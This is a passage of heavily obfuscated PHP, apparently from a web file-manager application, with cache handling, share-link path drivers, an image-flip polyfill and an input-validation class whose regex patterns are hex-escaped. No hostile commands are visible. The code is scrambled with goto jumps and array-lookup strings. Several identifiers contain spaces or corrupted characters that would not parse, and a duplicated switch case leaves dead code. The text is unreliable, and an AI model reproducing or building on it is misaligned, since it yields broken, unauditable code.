(!in_array($aàÃ©Šñ«, $eà¯Ìô°¯)) { $FÊ‰Ôñ­Ï”[] = $aàÃ©Šñ«; } } $FÊ‰Ôñ­Ï”[] = $eëš¼ºíç†; } $eëš¼ºíç† = implode($Bì™ó¬à°Õ[47], $FÊ‰Ôñ­Ï”); } public function sort($A‡§…Î­õ¸, $e‚ŒŞÕÌÆ) { return parent::update($A‡§…Î­õ¸, $e‚ŒŞÕÌÆ); } } goto dÎ„šŞÈ” ; AÛé´ š­: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto cî¹æ¹„Ä; c‘î·¦ÍÑ÷: $Dø‡Óäˆ”’ = $GLOBALS[$D›ÀŠ‚äã[6]][$D›ÀŠ‚äã[333]]; $e²ÊÆïÜ¥ = $Dø‡Óäˆ”’[$Dø‡Óäˆ”’[$D›ÀŠ‚äã[746]]]; $f¡Ø„¤ë³¼ = $Dø‡Óäˆ”’[$D›ÀŠ‚äã[747]]; goto eÂÃ³‡ÄÒâ; eÂÃ³‡ÄÒâ: switch ($Dø‡Óäˆ”’[$D›ÀŠ‚äã[746]]) { case $D›ÀŠ‚äã[17]: self::$handle = Model($D›ÀŠ‚äã[748]); break; case $D›ÀŠ‚äã[749]: self::$handle = new CacheRedis($e²ÊÆïÜ¥, $f¡Ø„¤ë³¼); break; case $D›ÀŠ‚äã[750]: self::$handle = new CacheMemcached($e²ÊÆïÜ¥, $f¡Ø„¤ë³¼); break; case $D›ÀŠ‚äã[163]: self::$handle = new CacheFile($e²ÊÆïÜ¥, $f¡Ø„¤ë³¼); break; default: break; } return self::$handle; goto Eó‡ÌÀŠ×Í; cî¹æ¹„Ä: $D›ÀŠ‚äã =& $_SERVER[Ö]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto c‘î·¦ÍÑ÷; Eó‡ÌÀŠ×Í: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($b»‰‰¾Ò) { if (is_array($b»‰‰¾Ò) || is_object($b»‰‰¾Ò)) { $b»‰‰¾Ò = json_encode($b»‰‰¾Ò); } $b»‰‰¾Ò = rawurlencode($b»‰‰¾Ò); return KOD_SITE_ID . $_SERVER[Ö][70] . $b»‰‰¾Ò; } public static function get($F³›“°ß÷Œ) { $c•°°‡‡©Ë = self::key($F³›“°ß÷Œ); if (!isset(self::$memoryCache[$c•°°‡‡©Ë])) { $e»âç…î‡Ñ = self::init()->get($c•°°‡‡©Ë); self::$memoryCache[$c•°°‡‡©Ë] = unserialize($e»âç…î‡Ñ); } return self::$memoryCache[$c•°°‡‡©Ë]; } public static function set($F’»‚½¶³›, $eÔé–¾”ƒï, $eùŒìâÍÔÛ = false) { goto d•§Õ˜¢¹‹; DâˆÀê­…›: CacheLock::lock($F’»‚½¶³›); $F‘Á…ÒÁ Ò = self::init()->set($bÙŞ«ŞŸÕà, serialize($eÔé–¾”ƒï), $eùŒìâÍÔÛ); self::$memoryCache[$bÙŞ«ŞŸÕà] = $eÔé–¾”ƒï; goto Aº‹­„„™å; d•§Õ˜¢¹‹: $bÙŞ«ŞŸÕà = self::key($F’»‚½¶³›); if (isset(self::$memoryCache[$bÙŞ«ŞŸÕà]) && self::$memoryCache[$bÙŞ«ŞŸÕà] === $eÔé–¾”ƒï) { return !0; } if ($eùŒìâÍÔÛ === 0) { self::$memoryCache[$bÙŞ«ŞŸÕà] = $eÔé–¾”ƒï; return !0; } goto DâˆÀê­…›; Aº‹­„„™å: CacheLock::unlock($F’»‚½¶³›); return $F‘Á…ÒÁ Ò; goto B“·ø”Ë‰‚; B“·ø”Ë‰‚: } public static function remove($f¾»•¼µµ) { goto Føñ‹„ã²; e¾ì´©ôŠ: return $E¥ë¦óå‰º; goto aöá‡ä˜; DÔÑï‘Ï¨…: CacheLock::lock($f¾»•¼µµ); $E¥ë¦óå‰º = self::init()->remove($AŸéÛ´îŞ); CacheLock::unlock($f¾»•¼µµ); goto e¾ì´©ôŠ; Føñ‹„ã²: $AŸéÛ´îŞ = self::key($f¾»•¼µµ); unset(self::$memoryCache[$AŸéÛ´îŞ]); self::clearTimeout(); goto DÔÑï‘Ï¨…; aöá‡ä˜: } public static function clearMemory($b¼æ›¨í¡Ü = false) { if ($b¼æ›¨í¡Ü) { $b¼æ›¨í¡Ü = self::key($b¼æ›¨í¡Ü); unset(self::$memoryCache[$b¼æ›¨í¡Ü]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ö][751])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ö][752])) { self::init()->clearTimeout(); } } } $FğîÈ’·â = LIB_DIR . $_SERVER[Ö][753]; $c¿µä¸Ô—é = $_SERVER[Ö][754]; goto e¨å›ÂË‡ª; b¸ÎŸ‚ó„¶: class PathDriverDbShareLink extends PathDriverDB { public function __construct($eÂÒÖÏÃÌœ) { $this->pathParse = $eÂÒÖÏÃÌœ; $this->model = Model($_SERVER[Ö][1103]); } protected function infoParse($BÖ‚ÚÙ‰£É, $c²”ªÁéÙ™ = false, $DÈçõ¿”© = false) { $D«ÒÜÍã’¡ =& $_SERVER[Ö]; return Action($D«ÒÜÍã’¡[1010])->sharePathInfo($this->pathParse[$D«ÒÜÍã’¡[75]], !0); } public function listPath($fğ’¿Ùğ, $cé—ŠÁ‰Åµ = false) { $Dö±Öæ¦İä =& $_SERVER[Ö]; $fƒÜ÷ÍÑ› = parent::listPath($fğ’¿Ùğ, $cé—ŠÁ‰Åµ); foreach ($fƒÜ÷ÍÑ› as $A®®„Í»Ç => $B¨à¢ƒ†ß) { if (!in_array($A®®„Í»Ç, array($Dö±Öæ¦İä[73], $Dö±Öæ¦İä[74]))) { continue; } foreach ($B¨à¢ƒ†ß as $a³ƒ†Äï„Ã => $b…ÖÏ°‹ÖÄ) { $fƒÜ÷ÍÑ›[$A®®„Í»Ç][$a³ƒ†Äï„Ã] = Action($Dö±Öæ¦İä[1010])->shareItemInfo($b…ÖÏ°‹ÖÄ); } } return $fƒÜ÷ÍÑ›; } public function listAll($e¼¡‡½¹ñË) { $E—­˜Ï½ƒ =& $_SERVER[Ö]; $BÆ¨Ã„ùøğ = IO::info($this->pathParse[$E—­˜Ï½ƒ[75]]); if (!$BÆ¨Ã„ùøğ) { return array(); } $EÇÆß•ä«– = $this->model->listAll($e¼¡‡½¹ñË); foreach ($EÇÆß•ä«– as &$cğİŞĞ„Ğ¶) { $cğİŞĞ„Ğ¶[$E—­˜Ï½ƒ[387]] = Action($E—­˜Ï½ƒ[1010])->shareItemInfo($cğİŞĞ„Ğ¶[$E—­˜Ï½ƒ[387]]); } return $EÇÆß•ä«–; } } class PathDriverDriverShareItem { public function __construct($F¿ñ‘ˆÂî) { $this->pathParse = $F¿ñ‘ˆÂî; } public function __call($aíÅ…ÑÉÉ¾, $Eæ”¨³„) { $f’›•ÊÜ¼ê =& $_SERVER[Ö]; if (method_exists($this, $aíÅ…ÑÉÉ¾)) { return; } $CâÓ»·ÙØ = call_user_func_array(array($f’›•ÊÜ¼ê[1110], $aíÅ…ÑÉÉ¾), $Eæ”¨³„); $C Öñ°Ì = array($f’›•ÊÜ¼ê[1111], $f’›•ÊÜ¼ê[1112], $f’›•ÊÜ¼ê[1113], $f’›•ÊÜ¼ê[1114], $f’›•ÊÜ¼ê[486], $f’›•ÊÜ¼ê[488], $f’›•ÊÜ¼ê[1115], $f’›•ÊÜ¼ê[102], $f’›•ÊÜ¼ê[1116], $f’›•ÊÜ¼ê[1117]); if (in_array($aíÅ…ÑÉÉ¾, $C Öñ°Ì)) { $CâÓ»·ÙØ = $this->getPathOuter($CâÓ»·ÙØ); } return $CâÓ»·ÙØ; } public function copy($d¹œÊíùÚ, $cÅ¬²ï‘„¯, $bæôğ”å’˜ = false) { return $this->copyMove($d¹œÊíùÚ, $cÅ¬²ï‘„¯, $bæôğ”å’˜, $_SERVER[Ö][486]); } public function move($BŠïò¿¤›, $b¶Çñƒä‚, $b„Üà‰×Ú› = false) { return $this->copyMove($BŠïò¿¤›, $b¶Çñƒä‚, $b„Üà‰×Ú›, $_SERVER[Ö][488]); } private function copyMove($BÌ’‡‡Ü¹º, $dÍÉ—ÂÕ½ö, $eŞ†áİ¥É±, $bÂÌÎÃˆƒš) { goto b‚Ó¼…¯à; b‚Ó¼…¯à: $E”Œ½Ö‘–¬ =& $_SERVER[Ö]; $bŠ××Ì÷½„ = $dÍÉ—ÂÕ½ö; $FØï‹ï…‘Ÿ = IO::driverMake($dÍÉ—ÂÕ½ö); goto cˆ­§Ó—Œ; cˆ­§Ó—Œ: if ($FØï‹ï…‘Ÿ->pathParse[$E”Œ½Ö‘–¬[991]]) { $dÍÉ—ÂÕ½ö = $FØï‹ï…‘Ÿ->pathParse[$E”Œ½Ö‘–¬[991]]; } else { $dÍÉ—ÂÕ½ö = $bŠ××Ì÷½„; } $Eºò´·ã© = IO::copyMove($BÌ’‡‡Ü¹º, $dÍÉ—ÂÕ½ö, $eŞ†áİ¥É±, $bÂÌÎÃˆƒš); $Eºò´·ã© = $this->getPathOuter($Eºò´·ã©); goto f×†âòÖ; f×†âòÖ: return $Eºò´·ã©; goto B¶¡ÔÅ¹‹; B¶¡ÔÅ¹‹: } public function pathFather($Fìôàôµ›) { return get_path_father($this->pathParse[$_SERVER[Ö][75]]); } public function iconvSystem($eóå–©Ó¦Ÿ) { return $eóå–©Ó¦Ÿ; } protected function infoParse($Aœ‰¤áöŞ) { $EÔ®ôˆ°àÔ =& $_SERVER[Ö]; $dáÑ¡™µ¨À = $this->pathParse[$EÔ®ôˆ°àÔ[435]][$EÔ®ôˆ°àÔ[1011]] . $this->pathParse[$EÔ®ôˆ°àÔ[1004]]; $eğ¨£ç”¨ = IO::info($dáÑ¡™µ¨À); $AÈÓ“ƒ­½ƒ = $this->pathParse[$EÔ®ôˆ°àÔ[435]]; return Action($EÔ®ôˆ°àÔ[1109])->_shareItemeParse($eğ¨£ç”¨, $AÈÓ“ƒ­½ƒ); } public function listAll($F¿œ½¬Š) { $FÈ°•ãØ¦„ =& $_SERVER[Ö]; $F¡·¾´Ü›Ø = IO::listAll($F¿œ½¬Š); $e¨ù“Æè³ˆ = $this->pathParse[$FÈ°•ãØ¦„[435]]; foreach ($F¡·¾´Ü›Ø as &$cì¨œÚ‘º¥) { check_abort(); $cì¨œÚ‘º¥ = array_merge(IO::info($cì¨œÚ‘º¥[$FÈ°•ãØ¦„[75]]), $cì¨œÚ‘º¥); $cì¨œÚ‘º¥[$FÈ°•ãØ¦„[387]] = Action($FÈ°•ãØ¦„[1109])->_shareItemeParse($cì¨œÚ‘º¥, $e¨ù“Æè³ˆ); } return $F¡·¾´Ü›Ø; } public function getPathOuter($båŒöêÚÊ) { goto D¦µ‚ƒ¬¶¼; D¦µ‚ƒ¬¶¼: $F¸ŠˆŞ¼£• =& $_SERVER[Ö]; $a÷ÂÏ«Ã­ = KodIO::parse($båŒöêÚÊ); if ($a÷ÂÏ«Ã­[$F¸ŠˆŞ¼£•[29]] == KodIO::KOD_SHARE_ITEM) { return $a÷ÂÏ«Ã­[$F¸ŠˆŞ¼£•[75]]; } goto C—Ó†Ïƒêç; aÆÕˆ„©‹î: if (substr($A¾µ‚¥æØÓ, 0, strlen($aîÁÅ‡Ç—£)) != $aîÁÅ‡Ç—£) { return !1; } return $this->pathParse[$F¸ŠˆŞ¼£•[1005]] . $F¸ŠˆŞ¼£•[8] . ltrim($b¼ãƒ½ˆ‰Ú, $F¸ŠˆŞ¼£•[8]); goto CõÑ«öİ†ç; C—Ó†Ïƒêç: $A¾µ‚¥æØÓ = KodIO::clear($båŒöêÚÊ); $aîÁÅ‡Ç—£ = KodIO::clear($this->pathParse[$F¸ŠˆŞ¼£•[435]][$F¸ŠˆŞ¼£•[1011]]); $b¼ãƒ½ˆ‰Ú = substr($A¾µ‚¥æØÓ, strlen($aîÁÅ‡Ç—£)); goto aÆÕˆ„©‹î; CõÑ«öİ†ç: } public function getType() { $dß¢ö­¹¡£ =& $_SERVER[Ö]; $EïÊ‰º‰¤ = str_replace($dß¢ö­¹¡£[71], $dß¢ö­¹¡£[33], get_class($this)); return strtolower($EïÊ‰º‰¤); } public function isTypeObject($bğ‚÷ğÓ»®) { return IO::isTypeObject($bğ‚÷ğÓ»®); } public function info($b¯ò´¬ë) { return $this->infoParse($b¯ò´¬ë); } public function infoAuth($e²ë¹å›é°) { return $this->infoParse($e²ë¹å›é°); } public function infoWithChildren($d¾¤§íà) { return $this->infoParse($d¾¤§íà); } public function infoFull($F™á“ÔÇ®Œ) { return $this->infoParse($F™á“ÔÇ®Œ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($F‡¾Ş’Ø‡µ) { $this->pathParse = $F‡¾Ş’Ø‡µ; } protected function infoParse($cÊæ«“Æ¬ó) { $cæ¦ª¶Âİ =& $_SERVER[Ö]; return Action($cæ¦ª¶Âİ[1010])->sharePathInfo($this->pathParse[$cæ¦ª¶Âİ[75]], !0); } public function listPath($Bºæ¼Š•Ä, $D˜Œ¯—Ğå§ = false) { $eÒÔ»õµ®  =& $_SERVER[Ö]; $D¥æšÁ´êé = IO::listPath($Bºæ¼Š•Ä, $D˜Œ¯—Ğå§); foreach ($D¥æšÁ´êé as $aªŞÓíƒß¥ => $CÜñ¶Õ±»­) { if (!in_array($aªŞÓíƒß¥, array($eÒÔ»õµ® [73], $eÒÔ»õµ® [74]))) { continue; } foreach ($CÜñ¶Õ±»­ as $Cö÷„Ÿ‚†É => $eŠ¨¡¸¶Ö) { $eŠ¨¡¸¶Ö = Action($eÒÔ»õµ® [1118])->parsePathChildren($eŠ¨¡¸¶Ö, array($eÒÔ»õµ® [383] => $Bºæ¼Š•Ä)); $D¥æšÁ´êé[$aªŞÓíƒß¥][$Cö÷„Ÿ‚†É] = Action($eÒÔ»õµ® [1010])->shareItemInfo($eŠ¨¡¸¶Ö); } } return $D¥æšÁ´êé; } public function listAll($Cèâ¼— Ú) { $DÓ‚¢ƒ‹ÑÔ =& $_SERVER[Ö]; $Dä˜ƒ‚ÈÍÏ = IO::listAll($Cèâ¼— Ú); foreach ($Dä˜ƒ‚ÈÍÏ as &$eŠ‡ô¬ø) { $eŠ‡ô¬ø = array_merge(IO::info($eŠ‡ô¬ø[$DÓ‚¢ƒ‹ÑÔ[75]]), $eŠ‡ô¬ø); $eŠ‡ô¬ø[$DÓ‚¢ƒ‹ÑÔ[387]] = Action($DÓ‚¢ƒ‹ÑÔ[1010])->shareItemInfo($eŠ‡ô¬ø); } return $Dä˜ƒ‚ÈÍÏ; } } goto B¾½µ¦öˆø; BÖÍ–¨ñö: if (!function_exists($_SERVER[Ö][1845])) { define($_SERVER[Ö][1846], 0); define($_SERVER[Ö][1847], 1); define($_SERVER[Ö][1848], 2); function imageflip($d˜²‘ÓÂÌ‰, $Fïßé‰ò‰) { switch ($Fïßé‰ò‰) { case IMG_FLIP_HORIZONTAL: $dˆÈä´ÒÚ = imagesx($d˜²‘ÓÂÌ‰) - 1; $E³‚ê¤¤·ô = $dˆÈä´ÒÚ / 2; $FØŠâ…®Ÿß = imagesy($d˜²‘ÓÂÌ‰); $D“À“Á‘ã = imageistruecolor($d˜²‘ÓÂÌ‰) ? imagecreatetruecolor(1, $FØŠâ…®Ÿß) : imagecreate(1, $FØŠâ…®Ÿß); for ($FñËÂ³… = 0; $FñËÂ³… < $E³‚ê¤¤·ô; ++$FñËÂ³…) { imagecopy($D“À“Á‘ã, $d˜²‘ÓÂÌ‰, 0, 0, $FñËÂ³…, 0, 1, $FØŠâ…®Ÿß); imagecopy($d˜²‘ÓÂÌ‰, $d˜²‘ÓÂÌ‰, $FñËÂ³…, 0, $dˆÈä´ÒÚ - $FñËÂ³…, 0, 1, $FØŠâ…®Ÿß); imagecopy($d˜²‘ÓÂÌ‰, $D“À“Á‘ã, $dˆÈä´ÒÚ - $FñËÂ³…, 0, 0, 0, 1, $FØŠâ…®Ÿß); } break; case IMG_FLIP_VERTICAL: $d„«Ô–‹ÊÔ = imagesx($d˜²‘ÓÂÌ‰); $Aùæİù‰»Í = imagesy($d˜²‘ÓÂÌ‰) - 1; $CÊ»¶é¦§® = $Aùæİù‰»Í / 2; $D“À“Á‘ã = imageistruecolor($d˜²‘ÓÂÌ‰) ? imagecreatetruecolor($d„«Ô–‹ÊÔ, 1) : imagecreate($d„«Ô–‹ÊÔ, 1); for ($D»¾ÀÀêœ = 0; $D»¾ÀÀêœ < $CÊ»¶é¦§®; ++$D»¾ÀÀêœ) { imagecopy($D“À“Á‘ã, $d˜²‘ÓÂÌ‰, 0, 0, 0, $D»¾ÀÀêœ, $d„«Ô–‹ÊÔ, 1); imagecopy($d˜²‘ÓÂÌ‰, $d˜²‘ÓÂÌ‰, 0, $D»¾ÀÀêœ, 0, $Aùæİù‰»Í - $D»¾ÀÀêœ, $d„«Ô–‹ÊÔ, 1); imagecopy($d˜²‘ÓÂÌ‰, $D“À“Á‘ã, 0, $Aùæİù‰»Í - $D»¾ÀÀêœ, 0, 0, $d„«Ô–‹ÊÔ, 1); } break; case IMG_FLIP_BOTH: $d„«Ô–‹ÊÔ = imagesx($d˜²‘ÓÂÌ‰); $FØŠâ…®Ÿß = imagesy($d˜²‘ÓÂÌ‰); $D“À“Á‘ã = imagerotate($d˜²‘ÓÂÌ‰, 180, 0); imagecopy($d˜²‘ÓÂÌ‰, $D“À“Á‘ã, 0, 0, 0, 0, $d„«Ô–‹ÊÔ, $FØŠâ…®Ÿß); break; default: return; } imagedestroy($D“À“Á‘ã); } } if (!function_exists($_SERVER[Ö][1849])) { function imagecreatefrombmp($CÖåÇÜˆÑ) { return ImageGdBMP::load($CÖåÇÜˆÑ); } } class Input { public static function getArray($CåÓÜŸŒ) { goto cŒ‰‹»À¤Ù; E²Öª§è°Õ: $BÙ´éóÌ»ç = array(); $cÄ¦Õø÷¶ = LNG($c ¦ºº“÷[1850]); foreach ($CåÓÜŸŒ as $f³¨êß©ÄŠ => $dÍçšùõÁĞ) { goto CáœêŠ½…Ş; EÈÏ÷§·¦Æ: if (!array_key_exists($f³¨êß©ÄŠ, $in)) { if (array_key_exists($c ¦ºº“÷[1852], $dÍçšùõÁĞ)) { if (!is_null($dÍçšùõÁĞ[$c ¦ºº“÷[1852]])) { $C‚–ˆ¬Œº“[$AË¨ÑŠ©¶à] = $dÍçšùõÁĞ[$c ¦ºº“÷[1852]]; } } else { if (isset($dÍçšùõÁĞ[$c ¦ºº“÷[1853]])) { $BÙ´éóÌ»ç[] = $a½ù“ËÌ÷; } } continue; } if (isset($dÍçšùõÁĞ[$c ¦ºº“÷[1853]]) && $dÍçšùõÁĞ[$c ¦ºº“÷[1853]] == $c ¦ºº“÷[278]) { $C´™øê­Úª = json_decode($in[$f³¨êß©ÄŠ], !0); if (is_array($C´™øê­Úª)) { $C‚–ˆ¬Œº“[$AË¨ÑŠ©¶à] = $C´™øê­Úª; } else { if (array_key_exists($c ¦ºº“÷[1852], $dÍçšùõÁĞ)) { if (!is_null($dÍçšùõÁĞ[$c ¦ºº“÷[1852]])) { $C‚–ˆ¬Œº“[$AË¨ÑŠ©¶à] = $dÍçšùõÁĞ[$c ¦ºº“÷[1852]]; } } else { $BÙ´éóÌ»ç[] = $a½ù“ËÌ÷; } } continue; } $bÅ·›öôøÒ = _get($dÍçšùõÁĞ, $c ¦ºº“÷[1004]); goto Fã¼Ú’Ë‡ù; Fã¼Ú’Ë‡ù: if (isset($dÍçšùõÁĞ[$c ¦ºº“÷[1853]]) && !self::check($in[$f³¨êß©ÄŠ], $dÍçšùõÁĞ[$c ¦ºº“÷[1853]], $bÅ·›öôøÒ)) { if (array_key_exists($c ¦ºº“÷[1852], $dÍçšùõÁĞ)) { if (!is_null($dÍçšùõÁĞ[$c ¦ºº“÷[1852]])) { $C‚–ˆ¬Œº“[$AË¨ÑŠ©¶à] = $dÍçšùõÁĞ[$c ¦ºº“÷[1852]]; } } else { $BÙ´éóÌ»ç[] = $a½ù“ËÌ÷; } continue; } $C‚–ˆ¬Œº“[$AË¨ÑŠ©¶à] = $in[$f³¨êß©ÄŠ]; goto aë ·’©‰Š; CáœêŠ½…Ş: $a½ù“ËÌ÷ = _get($dÍçšùõÁĞ, $c ¦ºº“÷[1231], $cÄ¦Õø÷¶ . $c ¦ºº“÷[875] . $f³¨êß©ÄŠ); $AË¨ÑŠ©¶à = $f³¨êß©ÄŠ; if (isset($dÍçšùõÁĞ[$c ¦ºº“÷[1851]]) && $dÍçšùõÁĞ[$c ¦ºº“÷[1851]]) { $AË¨ÑŠ©¶à = $dÍçšùõÁĞ[$c ¦ºº“÷[1851]]; } goto EÈÏ÷§·¦Æ; aë ·’©‰Š: } goto Aô÷Åâ·×„; Aô÷Åâ·×„: if (count($BÙ´éóÌ»ç) > 0) { show_json(implode($c ¦ºº“÷[1854], $BÙ´éóÌ»ç), !1); } return $C‚–ˆ¬Œº“; goto eÔøÂ áË©; cŒ‰‹»À¤Ù: $c ¦ºº“÷ =& $_SERVER[Ö]; global $in; $C‚–ˆ¬Œº“ = array(); goto E²Öª§è°Õ; eÔøÂ áË©: } public static function reg($cÇööÍã‘† = "\162\145\161\165\151\162\145") { static $DÕ®¦ïí  = array("\162\x65\161\x75\x69\x72\x65" => "\x2e\53", "\x6e\165\155\x62\145\162" => "\134\144\x2b", "\150\x65\170" => "\133\60\55\x39\101\x2d\x46\141\x2d\146\135\53", "\151\x6e\x74" => "\133\55\134\53\135\x3f\134\144\53", "\142\x6f\157\154" => "\x30\174\61", "\x66\154\x6f\141\x74" => "\x5b\x2d\x5c\53\135\77\134\144\x2b\50\x5c\x2e\134\x64\x2b\x29\x3f", "\x65\156\147\154\151\163\x68" => "\133\x41\x2d\132\x61\55\172\x20\135\x2b", "\143\150\151\156\x65\x73\145" => "\x5b\134\x78\x7b\x34\x65\x30\x30\175\55\134\x78\x7b\71\146\x61\65\175\135\x2b", "\x68\x61\163\x43\x68\151\x6e\x65\x73\x65" => "\x2f\x28\x5b\x5c\x78\173\x34\145\x30\60\x7d\55\x5c\170\173\71\x66\x61\65\x7d\x5d\53\51\x2f\x75", "\145\155\x61\151\154" => "\134\167\53\50\x5b\x5c\x2e\134\x2d\135\x5c\x77\x2b\51\52\134\100\134\167\53\x28\x5b\134\56\x5c\55\135\134\x77\x2b\x29\x2a\134\56\134\167\53", "\x70\x68\x6f\x6e\145" => "\61\x5b\x33\55\x39\x5d\x5c\x64\x7b\71\x7d", "\x74\x65\x6c\160\x68\157\156\x65" => "\x28\x5c\50\134\x64\x7b\63\x2c\x34\x7d\134\x29\174\134\144\x7b\63\x2c\64\x7d\x2d\174\134\x73\x29\x3f\134\x64\173\67\x2c\x31\64\175", "\x75\162\x6c" => "\50\x68\x74\164\x70\x7c\146\x74\x70\174\x68\x74\x74\160\163\51\x3a\x5c\x2f\x5c\57\x5b\134\167\x5c\55\137\135\53\50\134\x2e\x5b\134\167\x5c\55\137\x5d\53\x29\53\50\133\x5c\x77\x5c\55\x5c\56\x2c\x40\x3f\x5e\x3d\x25\x26\x3a\x5c\57\176\134\x2b\43\135\x2a\133\134\x77\134\x2d\134\x40\x3f\136\x3d\45\46\134\x2f\176\x5c\x2b\43\135\51\x3f", "\165\162\x6c\106\165\x6c\x6c" => "\133\x61\x2d\x7a\x41\55\172\135\x2b\72\x5c\x2f\x5c\57\x5b\x5e\134\x73\x5d\52", "\151\160" => "\50\x5c\144\173\61\54\63\175\134\x2e\51\x7b\x33\x7d\x28\134\x64\173\x31\x2c\63\x7d\x29", "\172\151\160" => "\133\61\55\x39\x5d\x5c\144\173\65\x7d\x28\x3f\x21\134\x64\x29", "\151\x64\103\141\162\144" => "\x28\134\x64\173\x31\x35\175\51\x7c\50\134\x64\173\61\x37\x7d\50\x5c\144\174\130\174\x78\x29\x29", "\143\157\154\x6f\162" => "\x23\50\133\x30\55\71\x41\55\x46\x61\x2d\x66\x5d\173\63\x7d\174\x5b\x30\55\71\x41\x2d\106\141\55\x66\135\x7b\66\175\x29", "\x74\151\x6d\x65" => "\50\133\60\55\61\x5d\x5c\144\x7c\x32\x5b\x30\x2d\x34\135\51\72\x5b\x30\x2d\x35\135\x5c\144", "\144\141\x74\x65" => "\x5c\144\173\64\175\x5b\x2d\134\57\135\x3f\50\60\133\61\x2d\x39\135\174\61\133\x30\55\62\135\51\x5b\55\134\x2f\135\x3f\x28\133\60\x2d\62\x5d\x5c\x64\174\x33\133\x30\55\61\135\x29", "\144\x61\164\x65\124\x69\x6d\145" => "\x5c\x64\173\64\175\x5b\x2d\x5c\57\135\77\x28\60\133\x31\55\71\x5d\174\61\x5b\60\x2d\62\135\51\x5b\x2d\134\x2f\135\x3f\50\133\60\x2d\62\x5d\134\x64\x7c\63\133\x30\55\61\x5d\51\x5c\x73\x2b\50\133\x30\x2d\61\135\134\144\174\x32\x5b\x30\55\x34\135\51\72\x5b\x30\x2d\65\135\134\x64", "\x70\141\x73\x73\x77\x6f\x72\144" => "\x28\x3f\75\56\x2a\134\x64\x29\50\77\75\56\x2a\133\141\x2d\x7a\x5d\51\50\x3f\75\x2e\52\133\x41\x2d\x5a\x5d\51\56\173\x38\x2c\x32\x30\x7d", "\153\145\171" => "\133\101\x2d\x5a\141\55\172\60\x2d\x39\137\134\x2d\x5c\x2e\x5d\x2b", "\153\x65\171\x46\165\154\x6c" => "\133\101\x2d\132\141\55\172\x30\x2d\x39\137\x5c\x2d\134\56\134\x73\x2c\135\53"); if (!$cÇööÍã‘†) { return $DÕ®¦ïí ; } return $DÕ®¦ïí [$cÇööÍã‘†]; } public static function check($AÕ´³‚½ùõ, $F„Áì¤Ë„Æ, $EíÔ‰å¿ßÛ = null) { $C¤ÂµÓ¹ÄÍ =& $_SERVER[Ö]; switch ($F„Áì¤Ë„Æ) { case $C¤ÂµÓ¹ÄÍ[7]: return in_array($AÕ´³‚½ùõ, $EíÔ‰å¿ßÛ); break; case $C¤ÂµÓ¹ÄÍ[1855]: return floatval($AÕ´³‚½ùõ) > $EíÔ‰å¿ßÛ; break; case $C¤ÂµÓ¹ÄÍ[1856]: return floatval($AÕ´³‚½ùõ) < $EíÔ‰å¿ßÛ; break; case $C¤ÂµÓ¹ÄÍ[321]: return strlen($AÕ´³‚½ùõ) >= $EíÔ‰å¿ßÛ[0] && strlen($AÕ´³‚½ùõ) <= $EíÔ‰å¿ßÛ[1]; break; case $C¤ÂµÓ¹ÄÍ[321]: if (is_array($EíÔ‰å¿ßÛ)) { return strlen($AÕ´³‚½ùõ) >= $EíÔ‰å¿ßÛ[0] && strlen($AÕ´³‚½ùõ) <= $EíÔ‰å¿ßÛ[1]; break; } else { return strlen($AÕ´³‚½ùõ) == $EíÔ‰å¿ßÛ; break; } case $C¤ÂµÓ¹ÄÍ[317]: return floatval($AÕ´³‚½ùõ) >= $EíÔ‰å¿ßÛ[0] && floatval($AÕ´³‚½ùõ) <= $EíÔ‰å¿ßÛ[1]; break; } $F÷¼Şº… = self::reg(!1); $F„Áì¤Ë„Æ = isset($F÷¼Şº…[$F„Áì¤Ë„Æ]) ? $F÷¼Şº…[$F„Áì¤Ë„Æ] : $F„Áì¤Ë„Æ; if (substr($F„Áì¤Ë„Æ, 0, 1) != $C¤ÂµÓ¹ÄÍ[8]) { $F„Áì¤Ë„Æ = $C¤ÂµÓ¹ÄÍ[1857] . $F„Áì¤Ë„Æ . $C¤ÂµÓ¹ÄÍ[1858]; } return preg_match($F„Áì¤Ë„Æ, $AÕ´³‚½ùõ) === 1; } public static function get($A‡™³İ£®´, $FÍ—«†•…ğ = null, $fŞ’ëŒ»˜Ğ = null, $D‚¯«—¹ÅÅ = null) { goto b“Å˜ÔŠïğ; EŒÍš¯š‘İ: if (!is_null($D‚¯«—¹ÅÅ)) { $EÄíò ·íÀ[$AğìÏ›§œ‘[1004]] = $D‚¯«—¹ÅÅ; } if (!is_null($FÍ—«†•…ğ)) { $EÄíò ·íÀ[$AğìÏ›§œ‘[1853]] = $FÍ—«†•…ğ; } $E½©ÎÁ”ìÑ = Input::getArray(array($A‡™³İ£®´ => $EÄíò ·íÀ)); goto D«øÛÜ»ŒÅ; b“Å˜ÔŠïğ: $AğìÏ›§œ‘ =& $_SERVER[Ö]; $EÄíò ·íÀ = array(); if (!is_null($fŞ’ëŒ»˜Ğ)) { $EÄíò ·íÀ[$AğìÏ›§œ‘[34]] = $fŞ’ëŒ»˜Ğ; } goto EŒÍš¯š‘İ; D«øÛÜ»ŒÅ: return $E½©ÎÁ”ìÑ[$A‡™³İ£®´]; goto B²Ö¶·÷Ø‹; B²Ö¶·÷Ø‹: } } goto c¢—Œæ„™ˆ; FÛé²¨íÍ¡: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $fÄ§æ©¢·ô =& $_SERVER[Ö]; $this->objectDriver = array($fÄ§æ©¢·ô[57], $fÄ§æ©¢·ô[58], $fÄ§æ©¢·ô[59], $fÄ§æ©¢·ô[60], $fÄ§æ©¢·ô[61], $fÄ§æ©¢·ô[62], $fÄ§æ©¢·ô[63], $fÄ§æ©¢·ô[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($d¶‚ÕŸâí) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($d¶‚ÕŸâí, $_SERVER[Ö][8]); } return $d¶‚ÕŸâí; } public function getPathName($f‚¿øÎÈâ¡) { return $f‚¿øÎÈâ¡; } public function iconvApp($Eæ½ÆÛ½ƒ­) { return $Eæ½ÆÛ½ƒ­; } public function iconvSystem($AÕÂìø†Š¯) { return $AÕÂìø†Š¯; } public function iconvTo($f¸èÀöâ¡Ü, $Cİî¢¤¢ÇÍ, 